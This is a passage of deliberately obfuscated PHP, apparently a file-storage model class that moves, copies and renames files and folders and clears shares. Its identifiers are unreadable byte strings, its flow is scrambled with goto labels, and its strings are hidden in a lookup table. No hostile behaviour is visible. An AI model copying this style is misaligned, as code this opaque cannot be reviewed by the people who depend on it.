$this->_childrenListCache[$c±‡“˜‚é¥] = array(); } $this->_childrenListCache[$c±‡“˜‚é¥][$d¯›Ê–Ãíœ] = $eñİ»òêÍ ; $this->_childrenItemCache[$d¯›Ê–Ãíœ] = $eñİ»òêÍ ; } goto aÍ×ôˆÃ•÷; aÍ×ôˆÃ•÷: } private function _childrenListAll($cÔª¸ÀÕ­È, &$F÷•Äİ™õë) { $eˆ©´¸¦§ò =& $_SERVER[Ö‘Øù]; if (!isset($this->_childrenListCache[$cÔª¸ÀÕ­È])) { return; } $cØğŠ‡ôç• = $this->_childrenListCache[$cÔª¸ÀÕ­È]; foreach ($cØğŠ‡ôç• as $fá¤õä…Ù => $eÀ“î‘Ò©) { $F÷•Äİ™õë[$fá¤õä…Ù] = $eÀ“î‘Ò©; if ($eÀ“î‘Ò©[$eˆ©´¸¦§ò[405]] == $eˆ©´¸¦§ò[87]) { $this->_childrenListAll($fá¤õä…Ù, $F÷•Äİ™õë); } } } private function sourceInfoCache($EµøØÔ®™) { if (isset($this->_childrenItemCache[$EµøØÔ®™])) { return $this->_childrenItemCache[$EµøØÔ®™]; } return $this->sourceInfo($EµøØÔ®™); } private function _childrenList($Bø¿£«ÔĞÄ) { if (isset($this->_childrenListCache[$Bø¿£«ÔĞÄ])) { return $this->_childrenListCache[$Bø¿£«ÔĞÄ]; } return $this->_childrenListSelect($Bø¿£«ÔĞÄ); } private function _childrenListSelect($eÅ²éÅµõ„) { goto d¬ëğÓØƒ‰; CÃùÚáÔ´: foreach ($fÑ¡‰×¡Í¿ as $eÅ²éÅµõ„ => $A‰©Ê·íò¨) { $this->_childrenItemCache[$eÅ²éÅµõ„] = $A‰©Ê·íò¨; } return $fÑ¡‰×¡Í¿; goto e·‚´µğÚ; b¦ÚŠ…³ß÷: $e ÎºõÅ‚‰ = $e ÎºõÅ‚‰ ? $e ÎºõÅ‚‰ : array(); $fÑ¡‰×¡Í¿ = array_to_keyvalue($e ÎºõÅ‚‰, $d±à®ïà[397]); $this->_childrenListCache[$eÅ²éÅµõ„] = $fÑ¡‰×¡Í¿; goto CÃùÚáÔ´; d¬ëğÓØƒ‰: $d±à®ïà =& $_SERVER[Ö‘Øù]; $F¥Ï¡‚¾Şˆ = array($d±à®ïà[493] => $eÅ²éÅµõ„, $d±à®ïà[425] => $this->targetIsDelete); $e ÎºõÅ‚‰ = $this->where($F¥Ï¡‚¾Şˆ)->select(); goto b¦ÚŠ…³ß÷; e·‚´µğÚ: } private function fileNameExistCache($dÍëŠ¥¿âÙ, $f°öØÜ¾) { $BØ¡õ«œÖ™ =& $_SERVER[Ö‘Øù]; $f°öØÜ¾ = strtolower($f°öØÜ¾); $Eîğ¡Àí‘¤ = $this->_childrenList($dÍëŠ¥¿âÙ); foreach ($Eîğ¡Àí‘¤ as $f£áÓÎ÷Û) { if ($f°öØÜ¾ == strtolower($f£áÓÎ÷Û[$BØ¡õ«œÖ™[28]])) { return $f£áÓÎ÷Û[$BØ¡õ«œÖ™[397]]; } } return !1; } private function fileNameAutoCache($aˆÚ³¼×©À, $DğÉ£ Ê, $B¡¿ïİ‰Ó, $D¶íâˆ„Â) { $aóĞªŒÀîö =& $_SERVER[Ö‘Øù]; $fè›…±¦è· = $this->_childrenList($aˆÚ³¼×©À); $Fãµ¨›™Ò = array_to_keyvalue($fè›…±¦è·, $aóĞªŒÀîö[33], $aóĞªŒÀîö[28]); return $this->fileNameAutoGet($Fãµ¨›™Ò, $DğÉ£ Ê, $B¡¿ïİ‰Ó, $D¶íâˆ„Â); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($b¨õêîò“, $e×ÜÕàäÇÌ, $b·§¯‡“± = REPEAT_REPLACE, $f´¡É©åËã = '') { goto EÙËŒ†…²Ø; EÙËŒ†…²Ø: $dï¥¬¦™­ =& $_SERVER[Ö‘Øù]; $F¶õÙ“¸óÙ = $this->sourceInfo($b¨õêîò“); $dĞÓòĞ¹Â™ = $this->sourceInfo($e×ÜÕàäÇÌ); goto CÄÁ„˜©„; cÒ‡“Ğ”£“: if ($F¶õÙ“¸óÙ[$dï¥¬¦™­[405]] == $dï¥¬¦™­[87] && $A‡˜Æ‚¨ò¿) { $this->folderSizeResetChildren($bŞØì«åù); } Model($dï¥¬¦™­[193])->linkAdd($bˆ¤ÖÈ÷Íƒ[$dï¥¬¦™­[555]]); if ($A‡˜Æ‚¨ò¿ && $bˆ¤ÖÈ÷Íƒ[$dï¥¬¦™­[587]]) { $this->removeNow($b¨õêîò“, !1); } goto A…Ô¸ƒ½ƒÁ; CÄÁ„˜©„: if ($F¶õÙ“¸óÙ[$dï¥¬¦™­[493]] == $dĞÓòĞ¹Â™[$dï¥¬¦™­[397]]) { if ($F¶õÙ“¸óÙ[$dï¥¬¦™­[425]] == $dï¥¬¦™­[87]) { Model($dï¥¬¦™­[423])->restore(array($b¨õêîò“)); } if (!$f´¡É©åËã || $f´¡É©åËã == $F¶õÙ“¸óÙ[$dï¥¬¦™­[28]]) { return $b¨õêîò“; } } $D÷íÄ·Î—¢ = $this->pathInfoMore($b¨õêîò“); if ($this->isParentOf($b¨õêîò“, $e×ÜÕàäÇÌ)) { return !1; } goto c•İÅÓ…ê; c•İÅÓ…ê: if (!$F¶õÙ“¸óÙ || !$dĞÓòĞ¹Â™ || $dĞÓòĞ¹Â™[$dï¥¬¦™­[405]] != $dï¥¬¦™­[87]) { return !1; } Hook::trigger($dï¥¬¦™­[585], $D÷íÄ·Î—¢); $this->targetIsDelete = intval($F¶õÙ“¸óÙ[$dï¥¬¦™­[425]]); goto BöáÛÕŸìˆ; BöáÛÕŸìˆ: if ($F¶õÙ“¸óÙ[$dï¥¬¦™­[493]] == $e×ÜÕàäÇÌ && $f´¡É©åËã != $F¶õÙ“¸óÙ[$dï¥¬¦™­[28]]) { $fÂ¥›Ä¨Ü = $this->fileNameExist($e×ÜÕàäÇÌ, $f´¡É©åËã); if ($fÂ¥›Ä¨Ü && $F¶õÙ“¸óÙ[$dï¥¬¦™­[405]] == $dï¥¬¦™­[191]) { goto bÛç½ƒª÷Ü; C˜ºöøù›: $this->removeNow($b¨õêîò“, !1); $this->folderSizeReset($e×ÜÕàäÇÌ); Hook::trigger($dï¥¬¦™­[586], $D÷íÄ·Î—¢); goto eãØñ‡—–è; bÛç½ƒª÷Ü: $cñÊŒƒ‹Ô‡ = $this->sourceInfo($fÂ¥›Ä¨Ü); $FİÆ‚Ô„Œ· = $this->fileHistory($cñÊŒƒ‹Ô‡, $F¶õÙ“¸óÙ[$dï¥¬¦™­[462]], $F¶õÙ“¸óÙ[$dï¥¬¦™­[78]]); if (!$FİÆ‚Ô„Œ·) { Model($dï¥¬¦™­[465])->remove($F¶õÙ“¸óÙ[$dï¥¬¦™­[462]]); } goto C˜ºöøù›; eãØñ‡—–è: return $fÂ¥›Ä¨Ü; goto B‡™ïÀÀÚƒ; B‡™ïÀÀÚƒ: } } $EˆÖ¨ØÀŠ = $f´¡É©åËã ? $f´¡É©åËã : $F¶õÙ“¸óÙ[$dï¥¬¦™­[28]]; $this->lockMoveStart($b¨õêîò“); goto bß¢ßÀª‰; B˜ò©Á‚Â¸: return $bŞØì«åù; goto d×È ÎòÈÆ; f¿ãÛ²Ÿß«: $this->folderSizeReset($e×ÜÕàäÇÌ); $EŠ£òÔŞ’ = array($F¶õÙ“¸óÙ[$dï¥¬¦™­[493]], $e×ÜÕàäÇÌ); if ($F¶õÙ“¸óÙ[$dï¥¬¦™­[405]] == $dï¥¬¦™­[87]) { $EŠ£òÔŞ’[] = $b¨õêîò“; } goto cÒŞâÜ´ñõ; bß¢ßÀª‰: $this->lockWriteStart($e×ÜÕàäÇÌ, $EˆÖ¨ØÀŠ); $bˆ¤ÖÈ÷Íƒ = array($dï¥¬¦™­[555] => array(), $dï¥¬¦™­[587] => !1); $this->clearShare($b¨õêîò“, $e×ÜÕàäÇÌ); goto a‡×Ò¨°¾¦; cÒŞâÜ´ñõ: $this->updateModifyTime($EŠ£òÔŞ’); Model($dï¥¬¦™­[559])->eventMove($b¨õêîò“, $F¶õÙ“¸óÙ[$dï¥¬¦™­[493]], $e×ÜÕàäÇÌ); Hook::trigger($dï¥¬¦™­[586], $D÷íÄ·Î—¢); goto B˜ò©Á‚Â¸; A…Ô¸ƒ½ƒÁ: $this->lockMoveEnd($b¨õêîò“); $this->lockWriteEnd($e×ÜÕàäÇÌ, $EˆÖ¨ØÀŠ); $this->folderSizeReset($F¶õÙ“¸óÙ[$dï¥¬¦™­[493]]); goto f¿ãÛ²Ÿß«; a‡×Ò¨°¾¦: $A‡˜Æ‚¨ò¿ = $this->fileNameExistCache($e×ÜÕàäÇÌ, $F¶õÙ“¸óÙ[$dï¥¬¦™­[28]]); $bŞØì«åù = $this->_move($b¨õêîò“, $e×ÜÕàäÇÌ, $b·§¯‡“±, $bˆ¤ÖÈ÷Íƒ, $f´¡É©åËã); $this->sourceCacheClear(); goto cÒ‡“Ğ”£“; d×È ÎòÈÆ: } private function _move($AåŞé‘‚, $eÓá££¬œ, $a¹ĞïŸ“Ô«, &$fŸßí“Ü¨, $AÌè÷÷ãâ = '') { goto BÂ—à‚ï’Í; a£ƒĞŒÇ´Ì: $this->lockWriteStart($eÓá££¬œ, $d†åó¨ÀªŒ); if (!$f…¡‘Ëğİ–) { return $this->_moveForce($AåŞé‘‚, $eÓá££¬œ, $d†åó¨ÀªŒ); } $DÃÏ¾Ãâ—İ = $f…¡‘Ëğİ–; goto B–ö•Çå™³; e‚µ‘–ƒ¨: return $DÃÏ¾Ãâ—İ; goto cœßé÷ßñø; f·öìôÊ‹š: $d†åó¨ÀªŒ = $AÌè÷÷ãâ ? $AÌè÷÷ãâ : $E«´î©Ç‹¼[$aŸ©·ÁÔÓé[28]]; $f…¡‘Ëğİ– = $this->fileNameExistCache($eÓá££¬œ, $d†åó¨ÀªŒ); $this->lockMoveStart($AåŞé‘‚); goto a£ƒĞŒÇ´Ì; B–ö•Çå™³: $fõ„ë‚§‰ = !1; if ($BÈ˜’ª) { if ($a¹ĞïŸ“Ô« == REPEAT_RENAME_FOLDER) { $d†åó¨ÀªŒ = $this->fileNameAuto($eÓá££¬œ, $d†åó¨ÀªŒ, $a¹ĞïŸ“Ô«, $BÈ˜’ª); $DÃÏ¾Ãâ—İ = $this->_moveForce($AåŞé‘‚, $eÓá££¬œ, $d†åó¨ÀªŒ); } else { if ($a¹ĞïŸ“Ô« == REPEAT_RENAME_FOLDER) { $a¹ĞïŸ“Ô« = REPEAT_RENAME; } $f½²äÜÎÑ´ = $this->_childrenListSelect($AåŞé‘‚); foreach ($f½²äÜÎÑ´ as $eÆî«ùâĞö) { $this->_move($eÆî«ùâĞö[$aŸ©·ÁÔÓé[397]], $f…¡‘Ëğİ–, $a¹ĞïŸ“Ô«, $fŸßí“Ü¨); } $fõ„ë‚§‰ = !0; } } else { if ($a¹ĞïŸ“Ô« == REPEAT_SKIP) { $fõ„ë‚§‰ = !0; } else { if ($a¹ĞïŸ“Ô« == REPEAT_RENAME || $a¹ĞïŸ“Ô« == REPEAT_RENAME_FOLDER) { $d†åó¨ÀªŒ = $this->fileNameAuto($eÓá££¬œ, $d†åó¨ÀªŒ, $a¹ĞïŸ“Ô«, $BÈ˜’ª); $DÃÏ¾Ãâ—İ = $this->_moveForce($AåŞé‘‚, $eÓá££¬œ, $d†åó¨ÀªŒ); } else { if ($a¹ĞïŸ“Ô« == REPEAT_REPLACE) { $fš˜öÙåª = $this->sourceInfoCache($f…¡‘Ëğİ–); $c…æï×“ = $this->fileHistory($fš˜öÙåª, $E«´î©Ç‹¼[$aŸ©·ÁÔÓé[462]], $E«´î©Ç‹¼[$aŸ©·ÁÔÓé[78]]); $fõ„ë‚§‰ = !0; if ($c…æï×“) { $fŸßí“Ü¨[$aŸ©·ÁÔÓé[555]][] = $E«´î©Ç‹¼[$aŸ©·ÁÔÓé[462]]; } } } } } if ($fõ„ë‚§‰ && !$fŸßí“Ü¨[$aŸ©·ÁÔÓé[587]]) { $fŸßí“Ü¨[$aŸ©·ÁÔÓé[587]] = !0; } goto e‚µ‘–ƒ¨; BÂ—à‚ï’Í: $aŸ©·ÁÔÓé =& $_SERVER[Ö‘Øù]; $E«´î©Ç‹¼ = $this->sourceInfo($AåŞé‘‚); $BÈ˜’ª = $E«´î©Ç‹¼[$aŸ©·ÁÔÓé[405]] == $aŸ©·ÁÔÓé[87]; goto f·öìôÊ‹š; cœßé÷ßñø: } private function _moveForce($B˜ÃÆàÜĞã, $B‹ìİ£Œ¢è, $bÂÆñ˜°“ù) { goto f¡Ğ…ßâæĞ; Cö¥ÁÖÛ‰¨: if ($b×ì‰¢İÏá) { $Aº´ƒÆÑ†§ = array($bÉ‚¯ÔàÙİ[579] => array($bÉ‚¯ÔàÙİ[539], $FŠæˆ¿œ¿¼[$bÉ‚¯ÔàÙİ[516]] . $FŠæˆ¿œ¿¼[$bÉ‚¯ÔàÙİ[397]] . $bÉ‚¯ÔàÙİ[540])); $D¡× ‹È¼¦ = $FŠæˆ¿œ¿¼[$bÉ‚¯ÔàÙİ[516]] . $FŠæˆ¿œ¿¼[$bÉ‚¯ÔàÙİ[397]] . $bÉ‚¯ÔàÙİ[47]; $D’çÁ†¹ÇÈ = $AÓõùº‚Ë[$bÉ‚¯ÔàÙİ[516]] . $AÓõùº‚Ë[$bÉ‚¯ÔàÙİ[397]] . $bÉ‚¯ÔàÙİ[47] . $FŠæˆ¿œ¿¼[$bÉ‚¯ÔàÙİ[397]] . $bÉ‚¯ÔàÙİ[47]; $b“‘áìŒî  = array($bÉ‚¯ÔàÙİ[579] => array($bÉ‚¯ÔàÙİ[588], "\x72\x65\160\x6c\x61\143\x65\x28\160\x61\x72\x65\156\164\114\x65\x76\145\154\54\x27{$D¡× ‹È¼¦}\47\54\47{$D’çÁ†¹ÇÈ}\47\x29"), $bÉ‚¯ÔàÙİ[575] => $AÓõùº‚Ë[$bÉ‚¯ÔàÙİ[406]], $bÉ‚¯ÔàÙİ[576] => $AÓõùº‚Ë[$bÉ‚¯ÔàÙİ[499]]); if ($Aùã»Æ£ñ) { $b“‘áìŒî [$bÉ‚¯ÔàÙİ[424]] = 0; } $this->where($Aº´ƒÆÑ†§)->data($b“‘áìŒî )->save(); } $this->where(array($bÉ‚¯ÔàÙİ[412] => $B˜ÃÆàÜĞã))->data($Fİ©ÉİŸ‚)->save(); return $B˜ÃÆàÜĞã; goto FŒˆãØœÌ; aéğğ“é£Ä: if (!$bÅïÄ¦Ò¤Â && $this->moveClearAuth) { Model($bÉ‚¯ÔàÙİ[497])->authClear($B˜ÃÆàÜĞã); } $Aùã»Æ£ñ = $FŠæˆ¿œ¿¼[$bÉ‚¯ÔàÙİ[425]] == $bÉ‚¯ÔàÙİ[87] && $AÓõùº‚Ë[$bÉ‚¯ÔàÙİ[425]] != $bÉ‚¯ÔàÙİ[87]; if ($Aùã»Æ£ñ) { $Fİ©ÉİŸ‚[$bÉ‚¯ÔàÙİ[424]] = 0; } goto Cö¥ÁÖÛ‰¨; bŒôÇÜ‘®Ê: $b×ì‰¢İÏá = $FŠæˆ¿œ¿¼[$bÉ‚¯ÔàÙİ[405]] == $bÉ‚¯ÔàÙİ[87]; $Fİ©ÉİŸ‚ = array($bÉ‚¯ÔàÙİ[396] => $AÓõùº‚Ë[$bÉ‚¯ÔàÙİ[397]], $bÉ‚¯ÔàÙİ[579] => $AÓõùº‚Ë[$bÉ‚¯ÔàÙİ[516]] . $AÓõùº‚Ë[$bÉ‚¯ÔàÙİ[397]] . $bÉ‚¯ÔàÙİ[47], $bÉ‚¯ÔàÙİ[575] => $AÓõùº‚Ë[$bÉ‚¯ÔàÙİ[406]], $bÉ‚¯ÔàÙİ[576] => $AÓõùº‚Ë[$bÉ‚¯ÔàÙİ[499]], $bÉ‚¯ÔàÙİ[578] => USER_ID, $bÉ‚¯ÔàÙİ[415] => $bÂÆñ˜°“ù); $bÅïÄ¦Ò¤Â = $FŠæˆ¿œ¿¼[$bÉ‚¯ÔàÙİ[406]] == SourceModel::TYPE_GROUP && $AÓõùº‚Ë[$bÉ‚¯ÔàÙİ[406]] == SourceModel::TYPE_GROUP && $FŠæˆ¿œ¿¼[$bÉ‚¯ÔàÙİ[499]] == $AÓõùº‚Ë[$bÉ‚¯ÔàÙİ[499]]; goto aéğğ“é£Ä; f¡Ğ…ßâæĞ: $bÉ‚¯ÔàÙİ =& $_SERVER[Ö‘Øù]; $FŠæˆ¿œ¿¼ = $this->sourceInfo($B˜ÃÆàÜĞã); $AÓõùº‚Ë = $this->sourceInfo($B‹ìİ£Œ¢è); goto bŒôÇÜ‘®Ê; FŒˆãØœÌ: } private function clearShare($F²¡‚ä‚ù‚, $f‘ª„’¢Œö) { goto b¹ËéëëØ; b¹ËéëëØ: $b‹ó¤×ˆ =& $_SERVER[Ö‘Øù]; $eÚÎ‡Èô = $this->sourceInfo($F²¡‚ä‚ù‚); $f¦äÌËöö„ = $this->sourceInfo($f‘ª„’¢Œö); goto D˜¯ÖÆŒÂ; D˜¯ÖÆŒÂ: if ($eÚÎ‡Èô[$b‹ó¤×ˆ[499]] == $f¦äÌËöö„[$b‹ó¤×ˆ[499]] && $eÚÎ‡Èô[$b‹ó¤×ˆ[406]] == $b‹ó¤×ˆ[589]) { return; } $aº¹Ãì¼õ­ = array($b‹ó¤×ˆ[516] => array($b‹ó¤×ˆ[539], $eÚÎ‡Èô[$b‹ó¤×ˆ[516]] . $F²¡‚ä‚ù‚ . $b‹ó¤×ˆ[540])); $fÊ«”­İÖ = $this->field($b‹ó¤×ˆ[412])->where($aº¹Ãì¼õ­)->getField($b‹ó¤×ˆ[397], !0); goto D×ØÉŸ°‡”; Bá­ÒãŒö÷: if (!$dîÒÙÓ¶á·) { return; } $dîÒÙÓ¶á· = array_to_keyvalue($dîÒÙÓ¶á·, $b‹ó¤×ˆ[33], $b‹ó¤×ˆ[483]); $aº¹Ãì¼õ­ = array($b‹ó¤×ˆ[483] => array($b‹ó¤×ˆ[7], $dîÒÙÓ¶á·)); goto EŸğ¿¬ŠÉ; EŸğ¿¬ŠÉ: Model($b‹ó¤×ˆ[590])->where($aº¹Ãì¼õ­)->save(array($b‹ó¤×ˆ[490] => 0)); Model($b‹ó¤×ˆ[591])->where($aº¹Ãì¼õ­)->delete(); goto cÃƒ¸Ç±÷Š; D×ØÉŸ°‡”: if (!$fÊ«”­İÖ) { return; } $aº¹Ãì¼õ­ = array($b‹ó¤×ˆ[397] => array($b‹ó¤×ˆ[7], $fÊ«”­İÖ), $b‹ó¤×ˆ[490] => 1); $dîÒÙÓ¶á· = Model($b‹ó¤×ˆ[590])->field($b‹ó¤×ˆ[483])->where($aº¹Ãì¼õ­)->select(); goto Bá­ÒãŒö÷; cÃƒ¸Ç±÷Š: } public function copyFolderFromIO($bÔÑçõÒ, $b§ñ¿ñÂ¾, $dˆ”Ä‡‡Ã…, $D°óóçõö, $dÎ½«¡ç»Ø, $cøÀ‡Ûòê¯ = false) { goto cßòİ ¦½; F…ÆäÅê‹¼: if ($e± «é§¦) { $this->_childrenAllMake($e± «é§¦); } Hook::trigger($b…‡÷äÄÀ[593]); $this->_copyChildTo($bÔÑçõÒ, $b§ñ¿ñÂ¾, $A½ØàÇº, $D°óóçõö, $d¬Ìğœ , $dÎ½«¡ç»Ø); goto Bã“Ëƒ¤”™; aç¨…çø®: Model($b…‡÷äÄÀ[465])->linkAdd($d¬Ìğœ [$b…‡÷äÄÀ[555]]); Model($b…‡÷äÄÀ[465])->remove($d¬Ìğœ [$b…‡÷äÄÀ[592]]); $this->folderSizeReset($dˆ”Ä‡‡Ã…); goto b“õ‹ùùô; E§ç›¯Î“: Model($b…‡÷äÄÀ[558])->addAll($d¬Ìğœ [$b…‡÷äÄÀ[556]], array(), !0); Model($b…‡÷äÄÀ[559])->eventCopy($A½ØàÇº); $this->saveAll($d¬Ìğœ [$b…‡÷äÄÀ[557]]); goto aç¨…çø®; Bã“Ëƒ¤”™: Hook::trigger($b…‡÷äÄÀ[594]); if ($A½ØàÇº) { $this->folderSizeResetChildren($A½ØàÇº); } $this->_childrenListClear(); goto E§ç›¯Î“; cßòİ ¦½: $b…‡÷äÄÀ =& $_SERVER[Ö‘Øù]; $d¬Ìğœ  = array($b…‡÷äÄÀ[556] => array(), $b…‡÷äÄÀ[557] => array(), $b…‡÷äÄÀ[555] => array(), $b…‡÷äÄÀ[592] => array()); $fèùÒê‰µ· = $cøÀ‡Ûòê¯ ? $cøÀ‡Ûòê¯ : $bÔÑçõÒ->pathThis($b§ñ¿ñÂ¾); goto Dœ¬¥¡‰…²; b“õ‹ùùô: $this->updateModifyTime($dˆ”Ä‡‡Ã…); return $A½ØàÇº; goto AÎ³…¿–ÉÏ; Dœ¬¥¡‰…²: $e± «é§¦ = $this->fileNameExist($dˆ”Ä‡‡Ã…, $fèùÒê‰µ·); $A½ØàÇº = $this->mkdir($dˆ”Ä‡‡Ã…, $fèùÒê‰µ·, $D°óóçõö); if (!$e± «é§¦ || $D°óóçõö == REPEAT_RENAME_FOLDER) { $D°óóçõö = !1; } goto F…ÆäÅê‹¼; AÎ³…¿–ÉÏ: } private function _copyChildTo($cäÉ˜á‡ä, $DĞß­†É­è, $aÇËÙ§¦Œ—, $E‚Ó¼µïí©, &$EƒË–Áê, $bÈ‚ê ‹¨¬) { goto D¨´‚ß¾ó; eø÷¦¦ƒ™¶: $c ¹‡‡œ = array(); foreach ($CïóäÎï¸Ë as &$cõ¡˜ğÎ—ˆ) { goto b†Ïƒ™; b†Ïƒ™: if (isset($BøßÑ³ƒ×Ğ[$cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[28]]])) { $cõ¡˜ğÎ—ˆ = $BøßÑ³ƒ×Ğ[$cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[28]]]; } $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[405]] = $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[29]] == $b‡ğœ‰ß¾[77]; $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[407]] = _get($cõ¡˜ğÎ—ˆ, $b‡ğœ‰ß¾[168], $b‡ğœ‰ß¾[33]); goto D¿Ä…Ê… ; bÊ…ëÂÓõ†: if ($E‚Ó¼µïí©) { $cµ º˜”ÁÏ = $this->fileNameExistCache($aÇËÙ§¦Œ—, $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[28]]); if ($cµ º˜”ÁÏ) { if ($cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[405]] || $E‚Ó¼µïí© == REPEAT_SKIP) { continue; } if ($E‚Ó¼µïí© == REPEAT_REPLACE) { $A±¾ÅÏ‹Îõ = $this->sourceInfoCache($cµ º˜”ÁÏ); $Døçµ¨ùóŸ = $this->fileHistory($A±¾ÅÏ‹Îõ, $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[462]], $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[78]]); if ($Døçµ¨ùóŸ) { $EƒË–Áê[$b‡ğœ‰ß¾[555]][] = $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[462]]; } continue; } else { if ($E‚Ó¼µïí© == REPEAT_RENAME) { $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[28]] = $this->fileNameAutoCache($aÇËÙ§¦Œ—, $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[28]], $E‚Ó¼µïí©, !1); } } } } if (!$cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[405]] && $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[462]]) { $EƒË–Áê[$b‡ğœ‰ß¾[555]][] = $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[462]]; } $c ¹‡‡œ[] = $this->_makeItemData($cõ¡˜ğÎ—ˆ, $b©Ï·¸ÕÁ, $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[28]]); goto fº®Šİ™Òµ; D¿Ä…Ê… : $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[78]] = _get($cõ¡˜ğÎ—ˆ, $b‡ğœ‰ß¾[78], 0); $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[462]] = _get($cõ¡˜ğÎ—ˆ, $b‡ğœ‰ß¾[462], 0); if (!isset($cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[595]]) && $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[462]]) { $EƒË–Áê[$b‡ğœ‰ß¾[592]][] = $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[462]]; } goto bÊ…ëÂÓõ†; fº®Šİ™Òµ: } unset($cõ¡˜ğÎ—ˆ); goto a£‘’¡ëÑ; a¿â¡ó¾¨ù: foreach ($CïóäÎï¸Ë as $cõ¡˜ğÎ—ˆ) { $A±¾ÅÏ‹Îõ = $eĞ”øÄ®’É[$cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[28]]]; $F»åª³’Á = $A±¾ÅÏ‹Îõ[$b‡ğœ‰ß¾[397]]; $this->_copyApplyMeta($A±¾ÅÏ‹Îõ, $EƒË–Áê); if ($cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[29]] == $b‡ğœ‰ß¾[77]) { $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[76]] = $cäÉ˜á‡ä->getPathInner($cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[76]]); $this->_copyChildTo($cäÉ˜á‡ä, $cõ¡˜ğÎ—ˆ[$b‡ğœ‰ß¾[76]], $F»åª³’Á, $E‚Ó¼µïí©, $EƒË–Áê, $bÈ‚ê ‹¨¬); } } goto Eƒ±…ˆÁ¹ ; a£‘’¡ëÑ: if (!empty($c ¹‡‡œ)) { $this->addAll($c ¹‡‡œ); $this->_childrenListSelect($aÇËÙ§¦Œ—); } $eĞ”øÄ®’É = $this->_childrenList($aÇËÙ§¦Œ—); $eĞ”øÄ®’É = array_to_keyvalue($eĞ”øÄ®’É, $b‡ğœ‰ß¾[28]); goto a¿â¡ó¾¨ù; D¨´‚ß¾ó: $b‡ğœ‰ß¾ =& $_SERVER[Ö‘Øù]; $b©Ï·¸ÕÁ = $this->sourceInfoCache($aÇËÙ§¦Œ—); $DµŠ”øöÆ• = $cäÉ˜á‡ä->listPath($DĞß­†É­è); goto Aß‰ÊÍ¦ê×; Aß‰ÊÍ¦ê×: $DµŠ”øöÆ• = $DµŠ”øöÆ• ? $DµŠ”øöÆ• : array($b‡ğœ‰ß¾[74] => array(), $b‡ğœ‰ß¾[75] => array()); $CïóäÎï¸Ë = array_merge($DµŠ”øöÆ•[$b‡ğœ‰ß¾[74]], $DµŠ”øöÆ•[$b‡ğœ‰ß¾[75]]); $BøßÑ³ƒ×Ğ = $this->_addFiles($cäÉ˜á‡ä, $DµŠ”øöÆ•[$b‡ğœ‰ß¾[74]], $bÈ‚ê ‹¨¬); goto eø÷¦¦ƒ™¶; Eƒ±…ˆÁ¹ : } private function _addFiles($aåÙå¾»ÈÎ, $C†êÉè÷®, $A—ÀË±Û¥) { goto Bñ¸áƒÆÑ´; F²ØÊ‡ÃÚ: $cÀ¹Ø‰‡¥ğ = $cÀ¹Ø‰‡¥ğ ? $cÀ¹Ø‰‡¥ğ : array(); foreach ($cÀ¹Ø‰‡¥ğ as $F“ŒĞç—Á±) { if (!isset($c›äî›í¦ª[$F“ŒĞç—Á±[$eÊÏ×ƒÛ‘Š[170]]])) { continue; } $FëéÓÒåİ =& $c›äî›í¦ª[$F“ŒĞç—Á±[$eÊÏ×ƒÛ‘Š[170]]]; foreach ($FëéÓÒåİ as &$BÈ¸„÷†ß¯) { $BÈ¸„÷†ß¯[$eÊÏ×ƒÛ‘Š[462]] = $F“ŒĞç—Á±[$eÊÏ×ƒÛ‘Š[462]]; } unset($BÈ¸„÷†ß¯); } $E®ºñœ‘¨ = array(); goto FóÖƒ›§ôõ; Bñ¸áƒÆÑ´: $eÊÏ×ƒÛ‘Š =& $_SERVER[Ö‘Øù]; if (!$C†êÉè÷® || count($C†êÉè÷®) == 0) { return array(); } $c›äî›í¦ª = array(); goto f”Ü»ÆÍöó; cÑğ¶É¢: $F—ØÒè¨¤æ->addAll($FĞ¸ÁŠ”Ë); $bÆñò­­Û = array($eÊÏ×ƒÛ‘Š[170] => array($eÊÏ×ƒÛ‘Š[7], array_keys($c›äî›í¦ª))); $cÀ¹Ø‰‡¥ğ = $F—ØÒè¨¤æ->where($bÆñò­­Û)->select(); goto F²ØÊ‡ÃÚ; FóÖƒ›§ôõ: foreach ($C†êÉè÷® as $b¤æ¾æƒö) { $E®ºñœ‘¨[$b¤æ¾æƒö[$eÊÏ×ƒÛ‘Š[28]]] = $b¤æ¾æƒö; } return $E®ºñœ‘¨; goto FÒ–ÆäÉáŒ; f”Ü»ÆÍöó: foreach ($C†êÉè÷® as &$BÈ¸„÷†ß¯) { goto aà¦¼ÌË; f–Š¤ÄÁ‹†: $BÈ¸„÷†ß¯[$eÊÏ×ƒÛ‘Š[170]] = $báÇÀ’ó«; Hook::trigger($eÊÏ×ƒÛ‘Š[597], $BÈ¸„÷†ß¯); $c›äî›í¦ª[$báÇÀ’ó«][] =& $BÈ¸„÷†ß¯; goto C¡ä‰Ú‡ô£; aà¦¼ÌË: Hook::trigger($eÊÏ×ƒÛ‘Š[596], $BÈ¸„÷†ß¯); $BÈ¸„÷†ß¯[$eÊÏ×ƒÛ‘Š[76]] = 